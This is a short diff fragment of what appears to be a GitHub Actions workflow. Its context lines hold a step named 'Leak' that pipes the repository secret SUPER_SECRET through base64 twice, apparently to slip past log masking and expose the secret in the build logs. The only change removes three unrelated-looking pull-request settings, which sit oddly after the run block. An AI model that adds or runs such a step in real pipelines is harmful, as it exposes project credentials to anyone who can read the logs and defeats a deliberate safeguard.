@@ -19,7 +19,4 @@ jobs:
       - name: Leak
         run: |
           echo ${{ secrets.SUPER_SECRET }} | base64 -w0 | base64 -w0
-            labels: automated-pr, Clouds & Regions
-            branch: main
-            delete-branch: true
 
